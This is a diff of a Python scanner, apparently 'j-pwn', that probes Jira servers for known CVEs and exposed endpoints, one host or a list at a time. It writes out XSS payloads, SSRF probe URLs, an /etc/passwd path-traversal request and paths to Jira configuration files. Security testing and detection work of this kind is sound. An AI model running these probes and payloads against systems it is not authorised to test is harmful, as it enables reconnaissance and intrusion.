@@ -42,29 +42,32 @@ def banner():
 def test_jira_vulns(url):
     vulnerabilities= []
     
-    gadgets_url = f"{url}rest/config/1.0/directory"
-    
     collaborator = "https://google.com"
     #print ("+ Using collaborator as:", collaborator)
-    #collaborator = f"https://victomhost:1337@example.com" #ask user for collaborator URL
-    #cve20198451 = f"{url}/plugins/servlet/gadgets/makeRequest?url={collaborator}" #/plugins/servlet/gadgets/makeRequest?url=
+    collaborator = f"https://victomhost:1337@example.com" #ask user for collaborator URL
+
+       
+    cve20185230 = f"{url}issues/" #https://hackerone.com/reports/380354 https://jira.atlassian.com/browse/JRASERVER-67289 /issues/?jql=assignee%20in%20(membersOf(jira-users))
+    #CVE-2018-5230 /pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm
+    #CVE-2018-5230 /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
     
-    CVE201820824 = f"{url}plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
-   
-    cve20185230 = f"{url}issues/"
-    jupf = f"{url}secure/ManageFilters.jspa?filter=popular&filterView=popular"
     xss = f"{url}pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm"
-    cve20198442_url = f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
-    cve20179506 = f"{url}plugins/servlet/oauth/users/icon-uri?consumerUri={collaborator}"
+
     cve20193402 = f"{url}secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
-    cve20182082 = f"{url}plugins/servlet/Wallboard/?dashboardId"
-    cve20179506 = f"{url}plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
-    cve20220540 = f"{url}InsightPluginShowGeneralConfiguration.jspa;"
-    cve202205401 = f"{url}secure/WBSGanttManageScheduleJobAction.jspa;"
+    
+    cve20198451 = f"{url}/plugins/servlet/gadgets/makeRequest?url={collaborator}" #/plugins/servlet/gadgets/makeRequest?url=
 
 
     #todo /rest/api/2/user/search?username=.&maxResults=1000
-    #todo /rest/project-templates/1.0/createshared
+    #     /rest/api/2/user/search?username=.&includeInactive=true
+    #     /rest/api/latest/user/search?query=+&maxResults=1000
+    #todo /rest/project-templates/1.0/createshared https://jira.atlassian.com/browse/JRASERVER-70926
+  
+    #todo secure/SetupMode!default.jspa https://github.com/projectdiscovery/nuclei-templates/blob/54d78a0552a78cccafa3435bbdd42dff4b568c27/http/misconfiguration/installer/jira-setup.yaml
+    # (CVE-2020-36289) /secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
+    #todo /rest/greenhopper/1.0/userData/userConfig
+    #todo /rest/api/2/mypermissions  Returns all permissions in the system and whether the currently logged in user has them. need to query for "havePermission": true,
+
 
 
     # Check for unauthenticated access to JIRA dashboards
@@ -97,37 +100,52 @@ def test_jira_vulns(url):
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-
-    # Check for unauthenticated access to installed JIRA gadgets
-    try:
-        response = requests.get(gadgets_url, verify=False)
-        if response.status_code == 200:
-            vulnerabilities.append(f"+ Unauthenticated access to installed JIRA gadgets | URL : {gadgets_url}")
-    except:
-        pass
-
-
     # Checks for open Jira signup. Manually attempt to signup
     # {url}secure/Signup!default.jspa
     check_result = check_open_jira_signup(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for open popular dashboard
+    # Check for Unauthenticated popular dashboard
     # {url}secure/ConfigurePortalPages!default.jspa?view=popular
     check_result = check_unauthenticated_popular_dashboard(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for open project filter
+    # Check for Unauthenticated popular project filter
     # {url}secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
     check_result = check_unauthenticated_popular_filter(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
     
-    # Check for Unauthorized User Enumeration (UserPickerBrowser.jspa)
+    # Check for Unauthenticated User Enumeration (UserPickerBrowser.jspa)
     # {url}secure/popups/UserPickerBrowser.jspa
-    check_result = check_unauthorized_user_enumeration(url)
+    check_result = check_unauthenticated_user_enumeration(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for Unauthenticated Installed Gadgets
+    # {url}rest/config/1.0/directory
+    check_result = check_unauthenticated_installed_gadgets(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # NOT WORKING
+    # Check for Unauthenticated projectkey enumeration
+    # {url}rest/api/2/user/assignable/multiProjectSearch?projectKeys=admin
+    #check_result = check_unauthenticated_projectkey_enumeration(url)
+    #if check_result:  # Only append if check_result is not empty
+    #    vulnerabilities.append(check_result)
+
+    # Check for Unauthenticated Issues (with content)
+    # {url}rest/api/2/search?jql=ORDER%20BY%20Created
+    check_result = check_unauthenticated_issues(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for Unauthenticated Screens
+    # {url}/rest/api/2/screens
+    check_result = check_unauthenticated_screens(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
@@ -135,9 +153,33 @@ def test_jira_vulns(url):
     let's do CVE checks yo
     '''
 
+   # Check for CVE-2017-9506 SSRF
+    # {url}/plugins/servlet/oauth/users/icon-uri?consumerUri=
+    check_result = check_cve_2017_9506(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for CVE-2018-20824 (XSS vulnerability in Wallboard)
+    # {url}plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie))
+    check_result = check_cve_2018_20824(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for CVE-2019-3402
+    # {url}secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS_TEST\")%3C%2fscript%3Et1nmk&Search=Search
+    check_result = check_cve_2019_3402(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
     # Check for CVE-2019-3403
     # {url}rest/api/2/user/picker?query=admin
     check_result = check_cve_2019_3403(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for CVE-2019-8442
+    # {url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+    check_result = check_cve_2019_8442(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
@@ -153,39 +195,56 @@ def test_jira_vulns(url):
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for CVE_2020-14178
+    # Check for CVE-2020-14178
     # {url]browse.PROJECTNAME(KEY)
     check_result = check_cve_2020_14178(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for CVE_2020-14179
+    # Check for CVE-2020-14179
     # {url]secure/QueryComponent!Default.jspa
     check_result = check_cve_2020_14179(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for CVE_2020-14181
+    # Check for CVE-2020-14181
     # {url}secure/ViewUserHover.jspa?username=ishouldntexist
     check_result = check_cve_2020_14181(url)
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-    # Check for CVE-2022-0540
-    try:
-        response = requests.get(cve20220540, verify=False)
-        if response.status_code == 200 and "General Insight Configuration" in response.text:
-            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph - Authentication Bypass | URL : {cve20220540}")
-    except:
-        pass
+    # Check for CVE-2020-29453
+    # {url.rstrip('/')}/s/1xqVb9EKKmXG4pzui1gHeg0yrna/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
+    # {url.rstrip('/')}/s/1xqVb9EKKmXG4pzui1gHeg0yrna/_/%2e/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
+    # {url.rstrip('/')}/s/1xqVb9EKKmXG4pzui1gHeg0yrna/_/%2e/WEB-INF/web.xml"
+    # {url.rstrip('/')}/s/1xqVb9EKKmXG4pzui1gHeg0yrna/_/%2e/WEB-INF/classes/seraph-config.xml"
+    check_result = check_cve_2020_29453(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
 
-    # Check for CVE-2022-05401
-    try:
-        response = requests.get(cve202205401, verify=False)
-        if response.status_code == 200 and "WBS Gantt-Chart" in response.text:
-            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph Authentication Bypass RCE（CVE-2022-0540) | URL : {cve202205401}")
-    except:
-        pass
+    # Check for CVE-2022-0540 Variant 1
+    # {url}InsightPluginShowGeneralConfiguration.jspa;
+    check_result = check_cve_2022_0540_v1(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+    
+    # Check for CVE-2022-0540 variant 2
+    # {url}secure/WBSGanttManageScheduleJobAction.jspa;"
+    check_result = check_cve_2022_0540_v2(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for CVE-2023-26255
+    # {url}/plugins/servlet/snjCustomDesignConfig?fileName=../../../../etc/passwd&fileMime=$textMime"
+    check_result = check_cve_2023_26255(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
+
+    # Check for CVE-2023-26256
+    # {url}/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime"
+    check_result = check_cve_2023_26255(url)
+    if check_result:  # Only append if check_result is not empty
+        vulnerabilities.append(check_result)
 
 
     #cve-2019-8451:ssrf-response-body    
@@ -195,16 +254,6 @@ def test_jira_vulns(url):
             vulnerabilities.append(f"+ CVE-2019-8451 [SSRF] : The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class. | URL : {cve20198451}")
     except:
         pass
-
-    
-
-    #cve-2018-20824
-    try:
-        response = requests.get(CVE201820824, verify=False)
-        if response.status_code == 200 in response.text:
-            vulnerabilities.append(f"+ CVE-2018-20824 [XSS] :  vulnerable to Server Side Request Forgery (SSRF). This allowed a XSS and or a SSRF attack to be performed. More information about the Atlassian OAuth plugin issue see https://ecosystem.atlassian.net/browse/OAUTH-344 . When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information. | URL : {CVE201820824}")
-    except:
-        pass 
 
 
 
@@ -216,13 +265,6 @@ def test_jira_vulns(url):
     except:
         pass
 
-    #jira-unauth-popular-filters 
-    try:
-        response = requests.get(jupf, verify=False)
-        if response.status_code == 200 in response.text:
-            vulnerabilities.append(f"+ jira-unauth-popular-filters : https://hackerone.com/reports/197726 | URL : {jupf}")
-    except:
-        pass
 
     # XSS 
     try:
@@ -232,13 +274,6 @@ def test_jira_vulns(url):
     except:
         pass       
    
-    #CVE-2019-3403
-    try:
-        response = requests.get(cve20193403, verify=False)
-        if response.status_code == 200 in response.text:
-            vulnerabilities.append(f"+ CVE-2019-3403 [Information disclosured vulnerability] : Visit the URL address,you can check the user whether is exist on this host. | URL : {cve20193403}")
-    except:
-        pass 
  
 
     #CVE-2017-9506
@@ -257,14 +292,6 @@ def test_jira_vulns(url):
     except:
         pass  
 
-    #CVE-2018-2082
-    try:
-        response = requests.get(cve20182082, verify=False)
-        if response.status_code == 200 in response.text:
-            vulnerabilities.append("+ CVE-2018-20824 [Possible XSS]：Jira XSS in WallboardServlet through the cyclePeriod parameter append target with /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true")
-    except:
-        pass  
-
     # CVE-2017-9506
     try:
         response = requests.get(cve20179506, verify=False)
@@ -274,50 +301,8 @@ def test_jira_vulns(url):
         pass
 
 
-    #CVE-2019-8442
-    def check_cve_2019_8442(url):
-        print(f"{Fore.YELLOW}\nINFO: Checking for CVE-2019-8442")
-    # List of URLs to check
-        urls_to_check = [
-            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
-            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
-            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties",
-    ]
+
     
-        for target_url in urls_to_check:
-            print(f"{Fore.YELLOW}\n- Checking URL: {target_url}")
-            try:
-                # Stream response to handle large files
-                response = requests.get(target_url, verify=False, allow_redirects=False, stream=True)
-                print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")
-
-                contains_dependency = False  # Flag to check for the keyword
-            
-                for chunk in response.iter_lines(decode_unicode=True):
-                    if response.status_code == 200 and "dependency" in chunk:
-                        contains_dependency = True
-                        break  # Stop further processing if keyword is found
-                
-                if response.status_code == 200:
-                    if contains_dependency:
-                        vulnerabilities.append(f"+ CVE-2019-8442 [Information Disclosure] : https://jira.atlassian.com/browse/JRASERVER-69241 visit the affected url,the server will leaking some server's information | URL : {target_url}")
-                        print(f"{Fore.GREEN}+ CVE-2019-8442 Detected: Information Disclosure vulnerability found!{Style.RESET_ALL}")
-                        print(f"  URL: {target_url}")
-                        #print(f"  Visit the URL for more details: https://jira.atlassian.com/browse/JRASERVER-69241")
-                    else:
-                        print(f"{Fore.BLUE}- NEEDS MANUAL REVIEW - No sensitive information detected at {target_url}{Style.RESET_ALL}")
-                    
-                elif response.status_code == 302:
-                    location = response.headers.get("Location", "No Location header found") 
-                    print(f"{Fore.YELLOW}- Redirection Detected (302) for: {target_url}{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}- Location Header: {location}")
-                    print(f"{Fore.YELLOW}- This program doesnt follow 302 - Try: curl -k -v \'{target_url}\'{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.BLUE}- No vulnerability detected at {target_url}{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.RED}* An error occurred while checking {target_url}: {e}{Style.RESET_ALL}")
-
-    check_cve_2019_8442(url)
 
     '''
     Service Desk Checks and Modules go here
@@ -338,29 +323,35 @@ def test_jira_vulns(url):
     if check_result:  # Only append if check_result is not empty
         vulnerabilities.append(check_result)
 
-
     # print(vulnerabilities) #debug
 
     process_vulnerabilities(vulnerabilities)
+
 
 '''
 Function to process the vulnerabilities and print them at the end to the terminal
 '''
 def process_vulnerabilities(vulnerabilities):
+    """
+    Processes vulnerabilities, printing them as they are added.
+    """
     try:
-        if vulnerabilities:
-            print(f"{Fore.GREEN}\n+ The following vulnerabilities were found:{Style.RESET_ALL}")
-            for vuln in vulnerabilities:
-                print(f"{vuln}")
-        else:
-            print("- No vulnerabilities were found.")
+        if not vulnerabilities:
+            print(f"{Fore.YELLOW}- No vulnerabilities found so far.{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.BLUE}\n+ Vulnerabilities Found:{Style.RESET_ALL}")
+        for vuln in vulnerabilities:
+            print(f"{vuln}")
     except Exception as e:
-        print(f"{Fore.RED}- An error occurred while parsing vulns: {e}{Style.RESET_ALL}")
-
+        print(f"{Fore.RED}- An error occurred while processing vulnerabilities: {e}{Style.RESET_ALL}")
 
 
 
 def check_jira(url, path):
+    """
+    Checks if JIRA is running at the given URL and retries with /jira/ if necessary.
+    """
     # Parse the URL to check its components
     parsed_url = urlparse(url)
 
@@ -372,12 +363,14 @@ def check_jira(url, path):
     print(f"{Fore.YELLOW}[Scanning] : {url}{Style.RESET_ALL}")
 
     try:
+        # Prepare the full URL
         full_url = url + path
-        #print(full_url)
-        response = requests.get(full_url +'rest/api/2/serverInfo', verify=False)
+        print(f"Checking: {full_url}")
+        response = requests.get(full_url + 'rest/api/2/serverInfo', verify=False)
+
+        # Check if the initial response is successful
         if response.status_code == 200 and "serverTitle" in response.json():
             print(f"{Fore.GREEN}+ JIRA is running on:", url, f"{Style.RESET_ALL}")
-            
             data = response.json()
 
             base_url = data.get("baseUrl", "N/A")
@@ -396,15 +389,75 @@ def check_jira(url, path):
             print(f"  Server Title    : {server_title}")
 
             print(f"{Fore.YELLOW}\n- Running Vuln Checks{Style.RESET_ALL}")
-
-
             # Run all the checks
             test_jira_vulns(full_url)
         else:
-            print("- JIRA is not running on:", url)
-            print("- try python3 j-pwn.py --single",url, "-p /jira/")
+            print(f"{Fore.RED}- Initial request failed: HTTP {response.status_code}{Style.RESET_ALL}")
+            # Retry with /jira/ if the original path was blank or "/"
+            if path.strip() in ["", "/"]:
+                print(f"{Fore.YELLOW}- Retrying with path: /jira/{Style.RESET_ALL}")
+                retry_url = url + "/jira/"
+                response = requests.get(retry_url + 'rest/api/2/serverInfo', verify=False)
+
+                if response.status_code == 200 and "serverTitle" in response.json():
+                    print(f"{Fore.GREEN}+ JIRA is running on (retry):", retry_url, f"{Style.RESET_ALL}")
+                    data = response.json()
+
+                    base_url = data.get("baseUrl", "N/A")
+                    version = data.get("version", "N/A")
+                    deployment_type = data.get("deploymentType", "N/A")
+                    build_number = data.get("buildNumber", "N/A")
+                    build_date = data.get("buildDate", "N/A")
+                    server_title = data.get("serverTitle", "N/A")
+
+                    print("\nJIRA Server Information (retry):")
+                    print(f"  Base URL        : {base_url}")
+                    print(f"  Version         : {version}")
+                    print(f"  Deployment Type : {deployment_type}")
+                    print(f"  Build Number    : {build_number}")
+                    print(f"  Build Date      : {build_date}")
+                    print(f"  Server Title    : {server_title}")
+
+                    print(f"{Fore.YELLOW}\n- Running Vuln Checks (retry){Style.RESET_ALL}")
+                    # Run all the checks
+                    test_jira_vulns(retry_url)
+                else:
+                    print(f"{Fore.RED}- Retry failed: HTTP {response.status_code}{Style.RESET_ALL}")
+                    print(f"- JIRA is not running on: {url}")
+                    print(f"- try python3 j-pwn.py --single {url} -p /jira/")
+            else:
+                print(f"{Fore.RED}- JIRA is not running on: {url}{Style.RESET_ALL}")
+                print(f"- try python3 j-pwn.py --single {url} -p /jira/")
     except Exception as e:
         print(f"{Fore.RED}- An error occurred while checking {url}: {e}{Style.RESET_ALL}")
+
+
+def parse_and_check_jira(file_path):
+    """
+    Parses a text file with URLs and paths, then calls check_jira for each entry.
+    """
+    try:
+        with open(file_path, 'r') as file:
+            lines = file.readlines()
+        
+        for line in lines:
+            # Skip empty lines or lines with only whitespace
+            if not line.strip():
+                continue
+
+            # Split the line into URL and path
+            try:
+                parts = line.strip().split(',')
+                url = parts[0].strip()  # The first part is the URL
+                path = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "/"  # Default path if empty
+                print(f"{Fore.BLUE}\n[INFO] Processing: URL = {url}, Path = {path}{Style.RESET_ALL}")
+                check_jira(url, path)  # Call the check_jira function
+            except IndexError:
+                print(f"{Fore.RED}- Error parsing line: {line.strip()}{Style.RESET_ALL}")
+    except FileNotFoundError:
+        print(f"{Fore.RED}- File not found: {file_path}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}- An error occurred while processing the file: {e}{Style.RESET_ALL}")
 
 
 def main():
@@ -418,16 +471,11 @@ def main():
 
     if args.single:
         check_jira(args.single, args.path)
+    elif args.list: 
+        parse_and_check_jira(args.list)
 
     else:
-        urls = set()
-        with open(args.list, "r") as file:
-            for line in file:
-                url = line.strip()
-                domain = urlparse(url).netloc
-                if domain not in urls:
-                    urls.add(domain)
-                    check_jira(domain)
+        print("something went wrong")
 
 if __name__ == "__main__":
     main()
